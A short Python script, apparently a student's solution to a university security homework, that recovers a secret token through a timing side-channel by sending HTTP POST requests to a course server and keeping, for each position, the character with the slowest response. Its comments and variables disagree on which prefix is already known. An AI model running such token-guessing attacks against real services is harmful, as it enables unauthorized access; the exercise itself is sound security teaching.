import json, requests
import time

#Here, I am putting in a list all possible characters that the token might have, in particular lower case letters and digits
PossibleCharacters = []
for i in range(97,123):
  PossibleCharacters.append(chr(i))
for i in range(48,58):
  PossibleCharacters.append(chr(i))

#Let me explain what is being done below. By testing and debugging, I noticed that whenever a certain character is correct in its sequence in the sent token,
#the delay time for the http response corresponding to the http post request increases.
#So, what comes naturally after that is to develop a script that iterates over all 12 characters of the token and does the following:
#The first token I try is "aaaaaaaaaaaa"
#For every character/iteration i, I already would have a current guess of the token (i.e. I would have guessed the i-1 first characters of the token),
#So, I would vary character i by looping over all possible characters in PossibleCharacters, and sending a http request for every one of them (the last 12 - i characters of token could be anything but in my case, I set them to "aaa....aa",
#all the while recording the time it takes for the http response to arrive. After that, I choose the character with the maximum response delay as my guess for the i'th character of the token.
#and I do this for all 12 characters to guess the final token.
#It is very easy to see how I could automate this script to run for all 12 characters and directly output the guessed token, but I had to do each iteration seperately because of network unreliabilities.
#In fact, I had sometimes to run the same iteration j many times to correctly figure out which is indeed the j'th character of the token (because sometimes I get false positives, i.e. the max response time would
#correspond to an incorrect character).
#This script below corresponds to the 6'th iteration, where I know already the first 5 characters "2fac3" and want to know the 6'th one.

Current_Token = "8cd98eced61"
MyGuess = ""
start = 0
end = 0
max_recorded_time = 0
ProbableCharacter = ""
for j in PossibleCharacters:
  Guess = Current_Token + j + MyGuess
  payload = json.dumps({"email":"cosmin.rusu@epfl.ch", "token": Guess})
  headers = {'Content-type': 'application/json'}
  start = time.time()
  r = requests.post('http://com402.epfl.ch/hw5/ex3', data = payload, headers=headers)
  end = time.time()
  time_elapsed = end - start
  print(r.text, Guess, time_elapsed)
  r.connection.close()
  if (max_recorded_time < time_elapsed):
    max_recorded_time = time_elapsed 
    ProbableCharacter = j

print (ProbableCharacter, max_recorded_time)

Guessed_Token = "2fac328d638d"

